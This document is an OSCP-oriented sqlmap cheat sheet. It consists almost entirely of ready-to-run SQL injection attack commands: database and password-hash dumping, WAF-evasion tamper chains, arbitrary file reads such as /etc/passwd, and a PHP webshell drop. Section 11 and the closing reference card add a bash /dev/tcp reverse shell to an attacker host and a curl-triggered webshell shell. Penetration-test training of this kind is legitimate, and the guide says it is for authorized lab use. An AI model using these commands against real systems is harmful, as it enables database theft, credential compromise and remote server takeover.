# sqlmap — A to Z OSCP Guide

> `<ATTACKER_IP>` = your machine, `<TARGET_IP>` = target. Every command explained inline — when, why, how.

---

## Table of Contents

1. [What sqlmap Is & Installation](#1-what-sqlmap-is--installation)
2. [Getting the Request Into sqlmap](#2-getting-the-request-into-sqlmap)
   - 2.1 Direct URL (GET)
   - 2.2 POST Data
   - 2.3 From a Burp Request File (-r)
   - 2.4 Cookies / Headers
   - 2.5 JSON Body
3. [Detection & Confirmation Flags](#3-detection--confirmation-flags)
4. [Database Enumeration Flags](#4-database-enumeration-flags)
5. [Table & Column Enumeration](#5-table--column-enumeration)
6. [Dumping Data](#6-dumping-data)
7. [Authentication Handling](#7-authentication-handling)
8. [Tamper Scripts — WAF Bypass](#8-tamper-scripts--waf-bypass)
9. [Risk, Level, Technique Tuning](#9-risk-level-technique-tuning)
10. [OS Shell & File Access](#10-os-shell--file-access)
11. [Getting a Reverse Shell via sqlmap](#11-getting-a-reverse-shell-via-sqlmap)
12. [Crawling & Forms](#12-crawling--forms)
13. [Performance & Output Control](#13-performance--output-control)
14. [Useful Combined One-Liners](#14-useful-combined-one-liners)
15. [Quick Reference Card](#15-quick-reference-card)

---

## 1. What sqlmap Is & Installation

sqlmap automates everything from the manual SQLi guide — detection, extraction technique selection, enumeration, and exploitation — across all major databases.

```bash
# Pre-installed on Kali
which sqlmap

# If missing
sudo apt install sqlmap
# or latest from source
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

---

## 2. Getting the Request Into sqlmap

### 2.1 Direct URL (GET)

```bash
# Test a GET parameter directly -- sqlmap auto-detects the injectable param
# when there's only one, or you mark it explicitly with *
sqlmap -u "http://<TARGET_IP>/item.php?id=1"

# Mark the exact injection point explicitly (useful with multiple params)
sqlmap -u "http://<TARGET_IP>/item.php?id=1&cat=2*"
```

### 2.2 POST Data

```bash
# --data sends the request as POST, with the SAME param-marking rules as GET
sqlmap -u "http://<TARGET_IP>/login.php" --data="username=admin&password=test"

# Mark specific param as injection point in POST body
sqlmap -u "http://<TARGET_IP>/login.php" --data="username=admin*&password=test"
```

### 2.3 From a Burp Request File (-r)

```bash
# Best method -- copy a full raw request from Burp (Repeater: Ctrl+R window,
# right-click -> Copy to file, or "Save item") including ALL headers/cookies,
# save as request.txt, then point sqlmap directly at the file
sqlmap -r request.txt

# Combine with batch mode to skip interactive prompts
sqlmap -r request.txt --batch
```

**Why -r is the most reliable method:** it captures the EXACT request (headers, cookies, content-type, auth tokens) instead of you manually reconstructing it -- avoids missing a required header that the app checks for before even reaching the SQL layer.

### 2.4 Cookies / Headers

```bash
# Inject via a cookie value
sqlmap -u "http://<TARGET_IP>/page.php" --cookie="PHPSESSID=abc123; id=1*"

# Inject via a custom header (e.g. X-Forwarded-For, common header-based SQLi spot)
sqlmap -u "http://<TARGET_IP>/page.php" --headers="X-Forwarded-For: 1*"

# Inject via User-Agent header specifically
sqlmap -u "http://<TARGET_IP>/page.php" --user-agent="Mozilla/5.0*"

# Inject via Referer header
sqlmap -u "http://<TARGET_IP>/page.php" --referer="http://test.com/1*"
```

### 2.5 JSON Body

```bash
# --data with a JSON string -- sqlmap detects JSON automatically in modern versions
sqlmap -u "http://<TARGET_IP>/api/login" \
  --data='{"username":"admin","password":"test"}' \
  --headers="Content-Type: application/json"
```

---

## 3. Detection & Confirmation Flags

```bash
# Basic run -- sqlmap tries detection automatically against marked/found params
sqlmap -u "http://<TARGET_IP>/item.php?id=1"

# --batch: auto-answer every prompt with the default (non-interactive, scriptable)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch

# Force testing of ALL parameters found in the request, not just the obvious one
sqlmap -u "http://<TARGET_IP>/item.php?id=1&cat=2" --batch --level=5

# Test specific parameter only (skip testing everything else, faster)
sqlmap -u "http://<TARGET_IP>/item.php?id=1&cat=2" -p id --batch

# Skip a specific parameter explicitly
sqlmap -u "http://<TARGET_IP>/item.php?id=1&token=xyz" --skip=token --batch

# Identify the DBMS without further exploitation (quick recon only)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --fingerprint
```

---

## 4. Database Enumeration Flags

```bash
# Confirm injection AND identify the back-end DBMS
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --dbs

# List all accessible databases (run this FIRST after confirming injection)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --dbs

# Current database in use by the application
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --current-db

# Current DB user
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --current-user

# Check if current user has DBA/admin privileges (relevant for file read/write/RCE later)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --is-dba

# List all DB users
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --users

# Dump password hashes of DB users (NOT app users -- the actual DB engine accounts)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --passwords

# List privileges per DB user
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --privileges

# List roles (PostgreSQL/Oracle specific)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --roles
```

---

## 5. Table & Column Enumeration

```bash
# List all tables in a SPECIFIC database (-D specifies which DB)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb --tables

# List columns of a specific table within that database
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users --columns

# List tables across ALL databases at once (slower, but thorough)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tables

# Search for a table/column NAME pattern across the whole DB server
# (useful when you don't know the exact table name -- e.g. find anything "user"-ish)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --search -T user
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --search -C password
```

---

## 6. Dumping Data

```bash
# Dump an ENTIRE table
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users --dump

# Dump SPECIFIC columns only (faster, less noisy output)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users -C username,password --dump

# Dump ALL tables in a database at once
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb --dump-all

# Dump literally everything sqlmap can see, across every accessible DB
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --dump-all

# Limit which ROWS get dumped (start,end -- 0-indexed) -- useful on huge tables
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users --dump --start=1 --stop=10

# Use a WHERE-style condition to dump only matching rows
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users -C username,password \
  --dump --where="role='admin'"

# Output to CSV explicitly (sqlmap saves dumps automatically, but you can re-export format)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users --dump --dump-format=CSV

# Where sqlmap SAVES dumps by default -- always check here after a session
ls ~/.local/share/sqlmap/output/<TARGET_IP>/dump/
```

---

## 7. Authentication Handling

```bash
# Site requires you to be logged in first -- pass your session cookie directly
sqlmap -u "http://<TARGET_IP>/dashboard.php?id=1" --cookie="PHPSESSID=abc123" --batch

# HTTP Basic Auth
sqlmap -u "http://<TARGET_IP>/admin.php?id=1" --auth-type=Basic --auth-cred="admin:password" --batch

# Site uses a CSRF token that changes per-request -- tell sqlmap which param/header holds it
sqlmap -u "http://<TARGET_IP>/page.php?id=1" --csrf-token=csrf_token --batch

# Provide login data + tell sqlmap where the logged-in marker is, so it
# can detect if it accidentally got logged out mid-scan and re-authenticate
sqlmap -u "http://<TARGET_IP>/dashboard.php?id=1" \
  --cookie="PHPSESSID=abc123" \
  --auth-cred="admin:password" \
  --batch

# If the session expires, --keep-alive or re-running with a fresh cookie may be needed
sqlmap -u "http://<TARGET_IP>/dashboard.php?id=1" --cookie="PHPSESSID=abc123" --keep-alive --batch
```

---

## 8. Tamper Scripts — WAF Bypass

```bash
# List ALL available tamper scripts
sqlmap --list-tampers

# space2comment: replaces spaces with /**/  -- bypasses naive space-stripping filters
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=space2comment

# between: replaces operators like > with BETWEEN/AND equivalents
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=between

# randomcase: randomizes keyword casing (UnIoN SeLeCt) -- bypasses case-sensitive filters
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=randomcase

# charencode: URL-encodes the whole payload -- bypasses basic input filters
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=charencode

# Stack MULTIPLE tamper scripts together (comma-separated, applied in order)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=space2comment,randomcase,charencode

# Common combo specifically aimed at bypassing a generic WAF (try this first if blocked)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch \
  --tamper=space2comment,between,randomcase,charunicodeescape

# --random-agent: rotates User-Agent per request -- avoids simple UA-based blocking
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --random-agent

# --delay and --safe-url: slow down requests / hit a "safe" URL periodically to
# avoid tripping rate-limit-based WAF/IDS blocking
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --delay=2 --safe-url="http://<TARGET_IP>/"
```

---

## 9. Risk, Level, Technique Tuning

```bash
# --level (1-5): how many request locations/parameter types sqlmap tests
#   1 = just the marked param (default, fastest)
#   5 = also tests headers, cookies, every param -- thorough but slow
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --level=5

# --risk (1-3): how aggressive/potentially destructive the payloads are
#   1 = safe (default)
#   3 = includes OR-based payloads that could affect data (e.g. mass UPDATE-style tests)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --risk=3

# Combine both for max thoroughness (use only when you have explicit scope/permission,
# since risk=3 payloads can theoretically modify data on a live app)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --level=5 --risk=3

# --technique: restrict to SPECIFIC injection types only
#   B=Boolean blind, E=Error-based, U=Union, S=Stacked queries, T=Time-based, Q=Inline queries
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --technique=U
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --technique=BT    # only boolean+time blind

# Force only TIME-based blind testing (useful when you've already manually confirmed
# blind SQLi works and just want sqlmap to extract data without wasting time on other types)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --technique=T
```

---

## 10. OS Shell & File Access

```bash
# Drop into an interactive SQL shell on the back-end DB directly
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --sql-shell
# sql-shell> SELECT * FROM users;

# Run a single raw SQL query without entering interactive mode
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --sql-query="SELECT version()"

# Read an arbitrary file off the DB server's filesystem (needs sufficient DB privileges)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --file-read="/etc/passwd"

# Write a local file TO the DB server's filesystem (e.g. drop a webshell)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch \
  --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Get an OPERATING SYSTEM shell directly (sqlmap automates the webshell-drop-and-call
# process behind the scenes for MySQL/MSSQL/PostgreSQL when conditions allow)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --os-shell

# Get a full OS command-execution interface without a true interactive shell
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --os-cmd="whoami"

# --os-pwn: attempts to set up a Metasploit-based OOB shell (meterpreter) automatically
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --os-pwn
```

**Why --os-shell sometimes fails and --sql-shell + manual file-write works instead:** `--os-shell` requires sqlmap to auto-detect a writable web directory AND the correct DBMS stacked-query/file-write capability simultaneously. If that auto-detection fails (e.g. wrong guessed web root path), doing it manually with `--file-write`/`--file-dest` lets YOU specify the exact path instead of relying on sqlmap's guess.

---

## 11. Getting a Reverse Shell via sqlmap

```bash
# Step 1 -- confirm DBA/admin privileges (needed for OS-level execution)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --is-dba

# Step 2 -- start your listener
nc -lvnp <LPORT>

# Step 3 -- let sqlmap try to get you an OS shell automatically
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --os-shell
# Once inside the os-shell prompt sqlmap gives you, run:
# os-shell> bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'

# Alternative -- manual webshell drop + curl trigger, if --os-shell auto-detect fails
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch \
  --file-write="/tmp/shell.php" --file-dest="/var/www/html/s.php"
# (where /tmp/shell.php locally contains: <?php system($_GET['c']); ?>)
curl "http://<TARGET_IP>/s.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<LPORT>+0>%261'"

# MSSQL specific -- enable xp_cmdshell then run it through sqlmap directly
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --os-cmd="whoami"
# sqlmap automatically enables xp_cmdshell behind the scenes for MSSQL when needed
```

---

## 12. Crawling & Forms

```bash
# Crawl the site automatically to find injectable forms/links (depth=2 levels deep)
sqlmap -u "http://<TARGET_IP>/" --batch --crawl=2

# Crawl AND automatically test every discovered form for SQLi
sqlmap -u "http://<TARGET_IP>/" --batch --crawl=3 --forms

# Limit crawl scope to a specific path/domain pattern
sqlmap -u "http://<TARGET_IP>/" --batch --crawl=2 --crawl-exclude="logout"

# Test a specific HTML form directly without crawling
sqlmap -u "http://<TARGET_IP>/login.php" --batch --forms
```

---

## 13. Performance & Output Control

```bash
# Increase concurrent requests (faster, but noisier/more detectable)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --threads=10

# Verbose output level (0=quiet ... 6=very detailed, shows every payload tried)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -v 3

# Save/resume a session -- useful for long-running dumps you don't want to restart
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --output-dir=/tmp/sqlmap_session

# Flush/clear session data (force a completely fresh detection, ignore cached results)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --flush-session

# Use a proxy (e.g. route sqlmap traffic through Burp to watch every request live)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --proxy="http://127.0.0.1:8080"

# Set a custom timeout (slow targets / heavy time-based blind extraction)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --timeout=30
```

---

## 14. Useful Combined One-Liners

```bash
# Full recon in one shot: confirm injection, get DBMS, current user/db, DBA check
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --dbs --current-db --current-user --is-dba

# Aggressive WAF-evasive scan against a hardened target
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase --random-agent

# Full table dump workflow in sequence (run these one after another)
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --dbs
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb --tables
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users --columns
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch -D appdb -T users -C username,password --dump

# Using a saved Burp request file with full automation + aggressive dump
sqlmap -r request.txt --batch --level=5 --risk=3 --dbs

# Straight to OS shell attempt, with WAF bypass tampers active
sqlmap -u "http://<TARGET_IP>/item.php?id=1" --batch --tamper=space2comment --os-shell
```

---

## 15. Quick Reference Card

```
====================================================================
 SQLMAP — A TO Z OSCP QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = target
====================================================================

[GET REQUEST IN]
  sqlmap -u "http://<TARGET_IP>/item.php?id=1"
  sqlmap -u "http://<TARGET_IP>/login.php" --data="user=a&pass=b"
  sqlmap -r request.txt                          <- BEST: full Burp-captured request
  sqlmap -u "..." --cookie="PHPSESSID=abc*"
  sqlmap -u "..." --headers="X-Forwarded-For: 1*"

[BASIC FLOW — RUN IN THIS ORDER]
  sqlmap -u "<URL>" --batch                       <- confirm injection
  sqlmap -u "<URL>" --batch --dbs                  <- list databases
  sqlmap -u "<URL>" --batch -D appdb --tables       <- list tables
  sqlmap -u "<URL>" --batch -D appdb -T users --columns  <- list columns
  sqlmap -u "<URL>" --batch -D appdb -T users -C username,password --dump  <- dump it

[RECON FLAGS]
  --current-db   --current-user   --is-dba   --users   --passwords   --privileges

[AUTH]
  --cookie="PHPSESSID=..."
  --auth-type=Basic --auth-cred="user:pass"
  --csrf-token=csrf_token

[WAF BYPASS]
  --tamper=space2comment,between,randomcase,charencode
  --random-agent
  --delay=2 --safe-url="http://<TARGET_IP>/"
  --list-tampers      <- see all available

[TUNING]
  --level=5 --risk=3       <- max thoroughness/aggressiveness
  --technique=U            <- restrict to UNION only
  --technique=BT           <- restrict to boolean+time blind only

[OS / FILE ACCESS]
  --sql-shell                                    <- interactive SQL prompt
  --sql-query="SELECT version()"                  <- single raw query
  --file-read="/etc/passwd"
  --file-write="local.php" --file-dest="/var/www/html/shell.php"
  --os-shell                                       <- automated OS shell
  --os-cmd="whoami"                                <- single OS command
  --os-pwn                                          <- Metasploit/meterpreter automation

[REVERSE SHELL via os-shell]
  nc -lvnp <LPORT>                                                [attacker]
  sqlmap -u "<URL>" --batch --os-shell
  os-shell> bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'

[CRAWLING]
  --crawl=2 --forms        <- auto-discover and test forms/links

[OUTPUT/PERFORMANCE]
  --threads=10    -v 3    --proxy="http://127.0.0.1:8080"
  Dump location: ~/.local/share/sqlmap/output/<TARGET_IP>/dump/

[KEY TAKEAWAY]
  -r request.txt is the most reliable input method. Always run the
  recon flags (--dbs --current-db --is-dba) before attempting --os-shell,
  since OS-level access depends entirely on DB privilege level.
====================================================================
```

---

*Authorized pentesting / OSCP lab use only.*
